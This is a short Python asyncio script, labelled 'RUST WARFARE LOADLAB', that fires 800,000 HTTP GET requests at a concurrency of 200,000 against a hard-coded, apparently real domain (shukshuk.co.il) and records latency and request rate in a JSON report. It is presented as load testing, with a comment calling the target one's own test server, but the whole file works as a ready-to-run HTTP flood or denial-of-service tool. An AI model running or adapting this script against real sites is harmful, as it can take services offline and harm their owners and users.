import asyncio
import aiohttp
import time
import json
import statistics

# آدرس سرور آزمایشی خودت
URL = "https://shukshuk.co.il"

TOTAL_REQUESTS = 800000
CONCURRENCY = 200000

async def worker(session, semaphore, results):
    async with semaphore:
        start = time.perf_counter()

        try:
            async with session.get(URL) as response:
                await response.read()

                latency = (time.perf_counter() - start) * 1000

                results.append({
                    "status": response.status,
                    "latency": round(latency, 2),
                    "success": 200 <= response.status < 400
                })

                print(f"[OK] {response.status} | {latency:.2f} ms")

        except Exception as e:
            results.append({
                "success": False,
                "error": str(e)
            })

            print(f"[ERROR] {e}")


async def main():
    print("=== RUST WARFARE LOADLAB ===")

    results = []
    semaphore = asyncio.Semaphore(CONCURRENCY)

    timeout = aiohttp.ClientTimeout(total=10)

    async with aiohttp.ClientSession(timeout=timeout) as session:
        start = time.perf_counter()

        tasks = [
            worker(session, semaphore, results)
            for _ in range(TOTAL_REQUESTS)
        ]

        await asyncio.gather(*tasks)

        elapsed = time.perf_counter() - start

    successful = [
        x["latency"] for x in results
        if x.get("success") and "latency" in x
    ]

    report = {
        "target": URL,
        "total": TOTAL_REQUESTS,
        "successful": len(successful),
        "failed": TOTAL_REQUESTS - len(successful),
        "duration": round(elapsed, 2),
        "average_latency": (
            round(statistics.mean(successful), 2)
            if successful else None
        ),
        "RPS": round(TOTAL_REQUESTS / elapsed, 2)
    }

    print(json.dumps(report, indent=4))

    with open("report.json", "w") as f:
        json.dump(report, f, indent=4)


asyncio.run(main())
